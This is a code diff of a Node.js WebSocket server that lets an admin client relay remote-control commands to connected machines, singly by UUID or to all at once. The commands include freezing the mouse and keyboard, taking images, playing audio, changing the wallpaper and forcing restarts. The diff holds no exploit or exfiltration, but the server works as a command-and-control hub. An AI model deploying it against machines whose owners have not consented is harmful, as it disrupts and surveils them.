@@ -1,7 +1,5 @@
-import { WebSocketServer } from "ws";
-import { randomUUID } from "crypto";
-import fs from "fs/promises";
-import fsSync from "fs";
+const { WebSocketServer } = require("ws");
+const { randomUUID } = require("crypto");
 
 const clients = new Map();
 const PORT = 8602;
@@ -10,7 +8,7 @@ const wss = new WebSocketServer({ port: PORT });
 
 console.log("Server listening on port:", PORT);
 
-// Broadcast PONG to all clients of type CLIENT every 5 seconds
+// PONG to all clients of type CLIENT every 5 seconds
 setInterval(() => {
   for (const client of clients.values()) {
     try {
@@ -18,19 +16,15 @@ setInterval(() => {
         client.socket.send("PONG");
       }
     } catch (e) {
-      // ignore send errors for individual sockets
     }
   }
 }, 5000);
 
-const INPUT_FILE = "./input";
-
-const knownCommands = ["FREEZE_MOUSE", "UNFREEZE_MOUSE", "FREEZE_KEYBOARD", "LIST_CLIENTS", "UNFREEZE_KEYBOARD", "VIDEO"];
+const knownCommands = ["FREEZE_MOUSE", "UNFREEZE_MOUSE", "FREEZE_KEYBOARD", "LIST_CLIENTS", "UNFREEZE_KEYBOARD", "IMAGE", "CALCULATOR", "SAFE_RESTART", "FORCE_RESTART", "AUDIO", "CHANGE_WALLPAPER", "BYE"];
+const knownSpecialCommands = ["ALL"];
 
 wss.on("connection", (socket) => {
   let clientUUID = null;
-
-  // connection opened; actual log happens when client sends HELLO_ or ADM
 
   socket.on("message", (data) => {
     const msg = data.toString();
@@ -89,23 +83,50 @@ wss.on("connection", (socket) => {
       return;
     } else if (msg.includes("|")) {
       const parts = msg.split("|");
-      const uuid = parts[0];
+      const firstPart = parts[0];
       const command = parts[1];
+      const arg1 = parts[2];
 
-      if (!knownCommands.includes(command)) return;
+      // console.log(msg);
 
       if (clients.get(clientUUID)?.type !== "ADM") {
         socket.send("ERROR_UNAUTHORIZED");
         return;
       }
 
-      const client = clients.get(uuid);
+      if (!knownCommands.includes(command)) return;
+
+      if (knownSpecialCommands.includes(firstPart.toUpperCase())) {
+        if (firstPart.toUpperCase() === "ALL") {
+          // Send to all clients
+          for (const [_, c] of clients) {
+            if (c.type === "ADM") continue;
+
+            if (arg1) {
+              c.socket.send(`${command}|${arg1}`);
+              continue;
+            }
+
+            c.socket.send(command);
+          }
+        }
+        socket.send(`${command} Sent to all clients..`);
+
+        return;
+      }
+
+      const client = clients.get(firstPart); // First part here is the UUID
+
       if (!client) {
         socket.send("ERROR_INVALID_UUID");
         return;
       }
 
-      client.socket.send(command);
+      if (arg1)
+        client.socket.send(`${command}|${arg1}`);
+      else
+        client.socket.send(command);
+
       return;
     }
   });
